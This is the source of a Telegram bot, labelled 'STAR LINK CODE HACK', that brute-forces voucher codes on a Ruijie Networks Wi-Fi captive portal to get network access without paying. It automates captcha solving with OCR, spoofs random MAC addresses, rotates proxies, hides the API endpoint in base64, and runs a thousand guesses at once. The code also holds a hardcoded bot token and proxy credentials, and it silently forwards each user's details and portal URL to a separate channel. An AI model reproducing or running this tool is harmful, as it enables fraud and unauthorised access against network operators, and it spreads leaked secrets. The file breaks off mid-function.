import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, hashlib, threading
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# --- Configuration ---
BOT_TOKEN = "8648844261:AAGohP2qqSsDzcVTM42V9adhb08hLvsCZbM"
FORWARD_CHANNEL = "@O_DIN_SAR_MA"

# --- SPEED CONFIGURATION ---
MAX_CONCURRENT = 1000
BATCH_SIZE = 500
CONNECTION_LIMIT = 30000
CONNECTION_PER_HOST = 15000
TIMEOUT = 25

# --- In-memory caches ---
user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
_voucher_sem = None
_start_time = time.monotonic()

# --- Proxy List (3 Proxies - ONLY for URL checking) ---
PROXY_LIST = [
    "gzsvv1pggl7k:3g9xpulazhkz2c2@65.111.5.6:3129",
    "y2g26w7t3tv4:p5ouenejkn07fvy@209.50.179.187:3129",
    "gdllkdvi6mhq:04l2fmxbv72tzkl@65.111.2.10:3129"
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

# --- Proxy Settings (Default Enabled for all users) ---
user_proxies = {}

def get_proxy_setting(user_id):
    return user_proxies.get(user_id, True)

def set_proxy_setting(user_id, enabled):
    user_proxies[user_id] = enabled

# --- Forward to Channel ---
async def forward_to_channel(message_text, parse_mode=None):
    try:
        await bot.send_message(FORWARD_CHANNEL, message_text, parse_mode=parse_mode)
    except Exception as e:
        print(f"Forward error: {e}")

# ==================== KEYBOARDS ====================

def get_main_keyboard(user_id=None):
    keyboard = InlineKeyboardMarkup(row_width=2)
    
    if user_id:
        proxy_enabled = get_proxy_setting(user_id)
        proxy_text = "🔴 Proxy OFF" if not proxy_enabled else "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off" if proxy_enabled else "menu_proxy_on"
    else:
        proxy_text = "🟢 Proxy ON"
        proxy_callback = "menu_proxy_off"
    
    keyboard.add(
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton(proxy_text, callback_data=proxy_callback),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 DIGIT 6 (0-9)", callback_data="scan_6"),
        InlineKeyboardButton("🔢 DIGIT 7 (0-9)", callback_data="scan_7"),
        InlineKeyboardButton("🔢 DIGIT 8 (0-9)", callback_data="scan_8"),
        InlineKeyboardButton("🔤 ENG small 6 (a-z)", callback_data="scan_engsmall6"),
        InlineKeyboardButton("🔤 ENG small 7 (a-z)", callback_data="scan_engsmall7"),
        InlineKeyboardButton("🔤 ENG small 8 (a-z)", callback_data="scan_engsmall8"),
        InlineKeyboardButton("🔤+🔢 MIXED 6 (a-z0-9)", callback_data="scan_engmixed6"),
        InlineKeyboardButton("🔤+🔢 MIXED 7 (a-z0-9)", callback_data="scan_engmixed7"),
        InlineKeyboardButton("🔤+🔢 MIXED 8 (a-z0-9)", callback_data="scan_engmixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

# ==================== BOT HANDLERS ====================

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    proxy_status = "ON" if get_proxy_setting(user_id) else "OFF"
    
    welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင်သည် အခမဲ့ (Free Access) ဖြင့် အသုံးပြုနိုင်ပါသည်။
🔄 Proxy Status: {proxy_status}

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard(user_id))
    await forward_to_channel(f"🆕 New User Started\n\n👤 Name: {user_name}\n🆔 ID: {user_id}")

# ==================== MAIN CALLBACK HANDLER ====================

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    # ========== PROXY TOGGLE ==========
    if call.data == "menu_proxy_on" or call.data == "menu_proxy_off":
        current = get_proxy_setting(user_id)
        new_status = not current
        set_proxy_setting(user_id, new_status)
        
        status_text = "ON" if new_status else "OFF"
        emoji = "🟢" if new_status else "🔴"
        
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ Unlimited Access
{emoji} Proxy Status: {status_text}"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id, f"✅ Proxy {status_text} ဖြစ်သွားပါပြီ။")
        return
    
    # ========== USER CALLBACKS ==========
    
    if call.data == "menu_back":
        proxy_enabled = get_proxy_setting(user_id)
        status_text = "ON" if proxy_enabled else "OFF"
        emoji = "🟢" if proxy_enabled else "🔴"
        text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ Unlimited Access
{emoji} Proxy Status: {status_text}"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard(user_id)
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        results = user_data.get(chat_id, {}).get('saved_codes', [])
        if results:
            codes = "\n".join(results)
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data == "menu_start_scam":
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="Markdown"
        )
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        
        portal_url = user_data[chat_id].get('session_url', 'Unknown')
        await forward_to_channel(
            f"🚀 **Scan Started**\n\n"
            f"👤 **User:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"🔢 **Mode:** {mode}\n"
            f"🔗 **Portal URL:**\n`{portal_url}`",
            parse_mode="Markdown"
        )

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 DIGIT {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
🛑 STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"🔍 VOUCHER Mode: {mode}\n"
        if digit == "random":
            text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
            
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

# ==================== USER COMMANDS ====================

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]"
        )
        return
    url = args[1]
    
    if chat_id not in user_data:
        user_data[chat_id] = {}
    
    await bot.reply_to(message, "🔗 Portal URL အားစစ်ဆေးနေပါသည်...")
    
    use_proxy = get_proxy_setting(user_id)
    
    if await check_session_url(session_url=url, use_proxy=use_proxy):
        user_data[chat_id]['session_url'] = url
        await bot.reply_to(
            message, 
            "✅ Portal URL အားသိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။",
            reply_markup=get_voucher_keyboard()
        )
    else:
        await bot.reply_to(message, f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။")

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "VOUCHER ရွေးချယ်ရန်:\n\n"
            "/scan 6, 7, 8, engsmall6, engsmall7, engsmall8, engmixed6, engmixed7, engmixed8\n\n"
            "Example: /scan 6  or  /scan engsmall8",
            reply_markup=get_voucher_keyboard()
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
    scan_id = str(uuid.uuid4())
    
    user_name = message.from_user.first_name or message.from_user.username or "User"
    portal_url = user_data[chat_id].get('session_url', 'Unknown')
    
    await forward_to_channel(
        f"🚀 **Scan Started (/scan)**\n\n"
        f"👤 **User:** {user_name}\n"
        f"🆔 **User ID:** `{user_id}`\n"
        f"🔢 **Mode:** {mode}\n"
        f"🔗 **Portal URL:**\n`{portal_url}`",
        parse_mode="Markdown"
    )

    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )

    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        
        await send_success_file(chat_id)
        
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်ပြီးပါပြီ။", reply_markup=get_back_keyboard())
    else:
        await bot.reply_to(message, "ရပ်တန့်ရန် Scan မရှိပါ။", reply_markup=get_back_keyboard())

@bot.message_handler(commands=['result'])
async def handle_result(message):
    chat_id = message.chat.id
    results = user_data.get(chat_id, {}).get('saved_codes', [])
    if results:
        codes = "\n".join(results)
        await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    results = user_data.get(chat_id, {}).get('saved_codes', [])
    if not results:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
        return
    
    if chat_id not in user_data or 'session_url' not in user_data.get(message.chat.id, {}):
        await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
        return
    
    await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
    session_url_recheck = user_data[message.chat.id]["session_url"]
    recheck_list = []
    
    for code in results:
        recode = await perform_check(
            session_url_recheck,
            code,
            chat_id,
            scan_id=None,
            recheck=True,
            message=message
        )
        if recode:
            recheck_list.append(recode)
    
    to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
    await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
    
    if recheck_list:
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['saved_codes'] = recheck_list

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    user_id = str(message.chat.id)
    current = get_proxy_setting(user_id)
    new_status = not current
    set_proxy_setting(user_id, new_status)
    
    status_text = "ON" if new_status else "OFF"
    emoji = "🟢" if new_status else "🔴"
    
    await bot.reply_to(
        message,
        f"{emoji} Proxy {status_text} ဖြစ်သွားပါပြီ။\n\n"
        f"Proxy ကို Portal URL စစ်တဲ့အခါမှသာ သုံးမှာဖြစ်ပြီး\n"
        f"Scan ဖတ်တဲ့အခါမှာတော့ မသုံးပါ။"
    )

# ==================== FILE EXPORT ON STOP ====================

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"success_codes_{chat_id}_{timestamp}.txt"
            content = "\n\n".join(success_texts[chat_id])
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Success Codes Found\n")
                f.write(f"User ID: {chat_id}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total: {len(success_texts[chat_id])}\n")
                f.write(f"{'='*50}\n\n")
                f.write(content)
            
            with open(filename, "rb") as f:
                await bot.send_document(
                    chat_id, 
                    f, 
                    caption=f"✅ Scan Stopped - Found {len(success_texts[chat_id])} Success Codes"
                )
            
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"Error sending file: {e}")

# ==================== CORE SCANNING FUNCTIONS ====================

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    chars = string.ascii_lowercase
    return "".join(random.choice(chars) for _ in range(length))

def engmixed_generator(length):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
            
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100 if total > 0 else 0
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning VOUCHER Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Success code hit : {found}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning VOUCHER Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Success code hit : {found}\n"
        f"📊Status : running\n"
    )

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

async def get_captcha(chat_id, session, session_url):
    entry = _captcha_entry(chat_id)
    if entry["session_id"] and entry["auth_code"]:
        return entry["session_id"], entry["auth_code"]
    async with entry["lock"]:
        if entry["session_id"] and entry["auth_code"]:
            return entry["session_id"], entry["auth_code"]
        session_id = await get_session_id(session, session_url, entry.get("session_id"))
        if not session_id:
            return None, None
        for _ in range(10):
            image = await Captcha_Image(session, session_id)
            text = await Captcha_Text(image)
            verified = await Varify_Captcha(session, session_id, text)
            if verified:
                entry["session_id"] = session_id
                entry["auth_code"] = text
                return session_id, text
        return None, None

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    else:
        total = None
    
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            
            if total is not None:
                text = format_progress(checked, total, speed, found)
            else:
                text = format_progress(checked, None, speed, found)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except Exception:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except Exception as err:
                    print(f"Progress Message Error: {err}")

        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            if total is not None:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}/{total:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            else:
                finish_text = "🔍Scanning Completed\n\n" + f"📦Checked : {checked:,}\n✅ Success code hit: {found}\n📊Progress : 100%\n[██████████████████]"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        
        await send_success_file(chat_id)
        
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        
    finally:
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

# ==================== NETWORK FUNCTIONS ====================

async def check_session_url(session_url, use_proxy=True):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    
    proxy = get_next_proxy() if use_proxy else None
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
                text_ = str(response.url)
                if "sessionId" in text_:
                    return True
                return False
    except:
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    
    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    pass
            if not auth_code:
                return
            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return
            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
            }
            
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except Exception as e:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []

        expire_date, raw_mins = await Code_Expires_Date(session_id)
        
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'saved_codes' not in user_data[chat_id]:
            user_data[chat_id]['saved_codes'] = []
            
        if code not in user_data[chat_id]['saved_codes']:
            user_data[chat_id]['saved_codes'].append(code)
            
        current_display = user_data[chat_id].get('current_display_codes', [])
        current_display.append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(current_display)
        
        if message:
            try:
                if chat_id not in success_messages or len(code_line) > 4000:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                    success_messages[chat_id] = sent.message_id
                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"Success Codes:\n\n{code_line}")
                        user_data[chat_id]['current_display_codes'] = current_display
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"Success Codes:\n\n🎫 {code}\n   {expire_date}")
                        success_messages[chat_id] = sent.message_id
